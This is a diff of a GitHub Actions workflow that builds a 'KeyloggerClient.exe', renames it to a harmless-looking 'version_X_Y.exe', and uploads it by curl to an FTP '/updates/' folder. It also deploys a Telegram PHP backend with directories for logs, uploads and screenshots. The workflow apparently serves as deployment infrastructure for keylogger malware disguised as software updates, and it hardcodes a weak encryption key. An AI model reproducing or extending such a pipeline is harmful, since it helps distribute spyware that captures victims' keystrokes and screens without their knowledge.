@@ -1,4 +1,4 @@
-name: Deploy Telegram PHP Backend to FTP
+name: Deploy Telegram PHP Backend and Build Python Client
 
 on:
   push:
@@ -13,6 +13,22 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v3
 
+    - name: Install Python dependencies (optional)
+      run: |
+        python3 -m pip install --upgrade pip
+        pip install -r requirements.txt || true
+
+    - name: Build Python client
+      run: |
+        python3 build.py
+
+    - name: Rename built client based on version
+      run: |
+        VERSION="${{ secrets.CLIENT_VERSION }}"
+        RENAMED="version_${VERSION//./_}.exe"
+        mv dist/KeyloggerClient.exe dist/$RENAMED
+        echo "RENAMED_FILE=$RENAMED" >> $GITHUB_ENV
+
     - name: Generate .env file from secrets
       run: |
         mkdir -p telegram/log telegram/uploads telegram/screenshots
@@ -21,16 +37,15 @@ jobs:
         echo "BOT_TOKEN=${{ secrets.BOT_TOKEN }}" >> telegram/.env
         echo "WEBHOOK_SECRET=${{ secrets.WEBHOOK_SECRET }}" >> telegram/.env
         echo "ADMIN_CHAT_ID=${{ secrets.ADMIN_CHAT_ID }}" >> telegram/.env
-
         echo "DB_HOST=${{ secrets.DB_HOST }}" >> telegram/.env
         echo "DB_NAME=${{ secrets.DB_NAME }}" >> telegram/.env
         echo "DB_USER=${{ secrets.DB_USER }}" >> telegram/.env
         echo "DB_PASS=${{ secrets.DB_PASS }}" >> telegram/.env
-
         echo "SECRET_TOKEN=1" >> telegram/.env
-        echo "ENCRYPTION_KEY=dGVzdF9rZXk=" >> telegram/.env  # base64(test_key)
+        echo "ENCRYPTION_KEY=dGVzdF9rZXk=" >> telegram/.env
+        echo "CLIENT_VERSION=${{ secrets.CLIENT_VERSION }}" >> telegram/.env
 
-    - name: Upload to FTP
+    - name: Upload Telegram backend to FTP
       uses: SamKirkland/FTP-Deploy-Action@4.0.0
       with:
         server: ${{ secrets.FTP_HOST }}
@@ -42,3 +57,9 @@ jobs:
           **/.git*
           **/.github*
           **/node_modules/*
+
+    - name: Upload built EXE to FTP /updates/
+      run: |
+        curl -T "dist/$RENAMED_FILE" \
+          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" \
+          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/$RENAMED_FILE"
